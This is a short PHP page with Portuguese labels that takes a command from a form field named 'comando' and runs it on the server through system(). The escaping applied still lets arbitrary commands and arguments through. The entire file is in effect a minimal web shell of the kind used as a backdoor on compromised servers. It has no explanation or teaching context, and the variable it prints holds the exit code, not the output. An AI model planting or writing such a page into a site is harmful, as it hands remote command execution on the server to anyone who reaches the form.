<?php

$retorno = "";

if($_SERVER["REQUEST_METHOD"] === "POST"){
    $cmd = addslashes(escapeshellcmd($_POST["comando"]));
    $comando = system($cmd, $retorno);    
}    

?>

<form method="post">
    <input type="text" name="comando">
    <input type="submit" value="Enviar">
</form>

<?php echo "<pre>$retorno</pre>"; ?>